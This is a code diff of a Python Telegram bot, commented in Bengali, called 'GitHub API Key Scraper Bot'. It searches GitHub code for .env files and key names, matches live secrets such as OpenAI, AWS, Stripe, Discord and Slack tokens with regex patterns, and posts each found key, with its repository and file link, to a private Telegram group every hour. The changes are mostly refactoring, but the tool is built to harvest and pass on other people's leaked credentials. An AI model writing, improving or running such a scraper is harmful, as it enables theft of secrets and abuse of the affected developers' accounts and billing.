@@ -40,9 +40,6 @@ def health_check():
 def health():
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200
 
-def run_flask():
-    flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
-
 # API কী ডিটেক্টর
 class APIScraper:
     def __init__(self, token: str):
@@ -56,17 +53,16 @@ class APIScraper:
         
         # API কী প্যাটার্ন
         self.patterns = {
-            'openai': r'sk-[a-zA-Z0-9]{48}',
-            'mistral': r'[A-Za-z0-9]{32}',
-            'google': r'AIza[0-9A-Za-z\-_]{35}',
-            'github': r'ghp_[0-9a-zA-Z]{36}',
-            'aws': r'AKIA[0-9A-Z]{16}',
-            'stripe': r'sk_live_[0-9a-zA-Z]{24}',
-            'discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
-            'telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
-            'slack': r'xox[baprs]-[0-9A-Za-z-]+',
-            'twilio': r'SK[0-9a-f]{32}',
-            'jwt': r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
+            'OpenAI': r'sk-[a-zA-Z0-9]{48}',
+            'Mistral': r'[A-Za-z0-9]{32}',
+            'Google': r'AIza[0-9A-Za-z\-_]{35}',
+            'GitHub': r'ghp_[0-9a-zA-Z]{36}',
+            'AWS': r'AKIA[0-9A-Z]{16}',
+            'Stripe': r'sk_live_[0-9a-zA-Z]{24}',
+            'Discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
+            'Telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
+            'Slack': r'xox[baprs]-[0-9A-Za-z-]+',
+            'Twilio': r'SK[0-9a-f]{32}'
         }
 
     def search_live_keys(self) -> List[Dict]:
@@ -74,7 +70,6 @@ class APIScraper:
         found_keys = []
         
         try:
-            # সার্চ কোয়েরি - .env ফাইল বা কোডে কী খুঁজে
             queries = [
                 'filename:.env',
                 'extension:env',
@@ -82,14 +77,11 @@ class APIScraper:
                 'MISTRAL_API_KEY',
                 'GOOGLE_API_KEY',
                 'API_KEY',
-                'SECRET_KEY',
-                'TOKEN',
-                'AUTH_TOKEN',
-                'API_SECRET'
+                'SECRET_KEY'
             ]
             
-            for query in queries[:3]:  # রেট লিমিট এড়াতে
-                url = f'{self.base_url}/search/code?q={query}+language:python+language:javascript+language:java&per_page=50'
+            for query in queries[:3]:
+                url = f'{self.base_url}/search/code?q={query}+language:python+language:javascript+language:java&per_page=30'
                 
                 try:
                     response = requests.get(url, headers=self.headers)
@@ -97,19 +89,19 @@ class APIScraper:
                         data = response.json()
                         items = data.get('items', [])
                         
-                        for item in items[:20]:  # প্রতি সার্চে ২০টি
+                        for item in items[:15]:
                             key_info = self._extract_key_from_file(item)
                             if key_info and key_info['key'] not in self.seen_keys:
                                 found_keys.append(key_info)
                                 self.seen_keys.add(key_info['key'])
                                 
-                    time.sleep(0.5)  # রেট লিমিট
+                    time.sleep(0.5)
                     
                 except Exception as e:
                     logger.error(f"Search error for {query}: {e}")
                     continue
                     
-            return found_keys[:30]  # সর্বোচ্চ ৩০টি
+            return found_keys[:20]
             
         except Exception as e:
             logger.error(f"API Scraper error: {e}")
@@ -122,7 +114,6 @@ class APIScraper:
             repo_name = item.get('repository', {}).get('full_name', 'Unknown')
             file_path = item.get('path', 'Unknown')
             
-            # ফাইলের কনটেন্ট পাওয়া
             content_response = requests.get(file_url, headers=self.headers)
             if content_response.status_code != 200:
                 return None
@@ -131,17 +122,15 @@ class APIScraper:
             if 'content' not in content_data:
                 return None
                 
-            # কনটেন্ট ডিকোড
             content = base64.b64decode(content_data['content']).decode('utf-8', errors='ignore')
             
-            # কী খোঁজা
             for key_type, pattern in self.patterns.items():
                 matches = re.findall(pattern, content)
                 for match in matches:
-                    if self._is_valid_key(match, key_type):
+                    if self._is_valid_key(match):
                         return {
                             'key': match,
-                            'type': key_type.upper(),
+                            'type': key_type,
                             'source': repo_name,
                             'file': file_path,
                             'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
@@ -154,12 +143,11 @@ class APIScraper:
             logger.error(f"Error extracting from file: {e}")
             return None
 
-    def _is_valid_key(self, key: str, key_type: str) -> bool:
+    def _is_valid_key(self, key: str) -> bool:
         """কী ভ্যালিড কিনা চেক করে"""
         if not key or len(key) < 10:
             return False
             
-        # কিছু বাদ দিতে
         exclude_patterns = [
             r'^test_',
             r'^example_',
@@ -206,6 +194,7 @@ class KeyScraperBot:
         self.bot = None
         self.scraper = APIScraper(GITHUB_TOKEN)
         self.is_running = True
+        self.startup_sent = False
 
     def start(self):
         try:
@@ -217,11 +206,12 @@ class KeyScraperBot:
             dp.add_handler(CallbackQueryHandler(self.button_callback))
             dp.add_error_handler(self.error_handler)
             
-            # স্টার্টআপ
-            threading.Thread(target=self.send_startup_message, daemon=True).start()
+            # শিডিউলার থ্রেড
             threading.Thread(target=self.run_scheduler, daemon=True).start()
             
             logger.info("✅ Key Scraper Bot started!")
+            
+            # পোলিং স্টার্ট
             self.updater.start_polling()
             self.updater.idle()
             
@@ -230,8 +220,12 @@ class KeyScraperBot:
             raise
 
     def send_startup_message(self):
+        """স্টার্টআপ মেসেজ (শুধু একবার)"""
+        if self.startup_sent:
+            return
+            
         try:
-            time.sleep(3)
+            time.sleep(5)
             self.bot.send_message(
                 chat_id=self.group_id,
                 text="🔐 **GitHub API Key Scraper Bot**\n\n"
@@ -242,25 +236,35 @@ class KeyScraperBot:
                      "/start - কন্ট্রোল প্যানেল",
                 parse_mode='Markdown'
             )
+            self.startup_sent = True
         except Exception as e:
             logger.error(f"Startup error: {e}")
 
     def run_scheduler(self):
+        """শিডিউলার - প্রতি ১ ঘন্টায় রান"""
+        # প্রথমে স্টার্টআপ মেসেজ
+        self.send_startup_message()
+        
         while self.is_running:
             try:
                 logger.info("🔍 Starting key scan...")
                 keys = self.scraper.search_live_keys()
                 if keys:
-                    for key_info in keys[:5]:  # প্রতি বার ৫টি
+                    for key_info in keys[:5]:
                         message = self.format_key_message(key_info)
-                        self.bot.send_message(
-                            chat_id=self.group_id,
-                            text=message,
-                            parse_mode='Markdown',
-                            disable_web_page_preview=True
-                        )
-                        time.sleep(0.5)
+                        try:
+                            self.bot.send_message(
+                                chat_id=self.group_id,
+                                text=message,
+                                parse_mode='Markdown',
+                                disable_web_page_preview=True
+                            )
+                            time.sleep(0.5)
+                        except Exception as e:
+                            logger.error(f"Send error: {e}")
                     logger.info(f"✅ Sent {len(keys[:5])} new keys")
+                else:
+                    logger.info("No new keys found")
             except Exception as e:
                 logger.error(f"Scheduler error: {e}")
             time.sleep(3600)  # ১ ঘন্টা
@@ -393,15 +397,20 @@ class KeyScraperBot:
     def error_handler(self, update: Update, context):
         logger.error(f"Update {update} caused error {context.error}")
 
-# মেইন
+# মেইন ফাংশন
 def main():
     try:
+        # এনভায়রনমেন্ট ভেরিয়েবল চেক
         if not all([BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID, GITHUB_TOKEN]):
-            raise ValueError("Missing environment variables")
-
-        # ফ্লাস্ক থ্রেড
-        threading.Thread(target=run_flask, daemon=True).start()
-        logger.info("🌐 Flask started on port 8080")
+            raise ValueError("Missing required environment variables")
+            
+        # ফ্লাস্ক থ্রেড (হেলথ চেকের জন্য)
+        def run_flask():
+            flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+        
+        flask_thread = threading.Thread(target=run_flask, daemon=True)
+        flask_thread.start()
+        logger.info("🌐 Flask server started on port 8080")
 
         # বট স্টার্ট
         bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
